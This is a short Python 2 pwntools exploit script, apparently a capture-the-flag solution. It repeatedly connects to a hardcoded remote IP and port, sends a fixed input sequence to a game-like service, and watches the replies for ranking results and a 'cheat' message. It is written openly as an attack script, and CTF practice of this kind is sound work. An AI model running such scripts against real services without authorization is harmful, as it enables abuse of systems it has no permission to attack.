#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './target'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

def sendLines(name):
    payload = 'A'
    io.sendline(payload)
    payload = '0'
    io.sendline(payload)
    payload = 'B'
    io.sendline(payload)
    payload = '0'
    io.sendline(payload)
    payload = 'C'
    io.sendline(payload)
    payload = '0'
    io.sendline(payload)
    payload = 'D'
    io.sendline(payload)
    payload = '0'
    io.sendline(payload)
    payload = 'E'
    io.sendline(payload)
    payload = '0'
    io.sendline(payload)
    payload = name
    io.send(payload)
    content = io.recv(timeout=1)
    return content

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

logger = log.progress('bad count: ')
j = 0
name = 'jakejake'
print name
while True:
    try:
        context.log_level = 'critical'  # suspend all logging
        io = remote("54.161.125.246", 1002)
        for i in range(0, 50):
            content = sendLines(name)
            if '3. ' + name in content:
                print '3 Wins'
            elif '4. ' + name in content:
                print '4 Wins'
            elif '5. ' + name in content:
                print content
                break
            elif 'cheat' in content:
                print content
    except EOFError:
        context.log_level = 'info'  # resume all logging
        logger.status(str(j))
        context.log_level = 'critical'  # suspend all logging
        j = j + 1
        io.close()
    except:
        print 'Hung Up'
        io.close()

io.interactive()
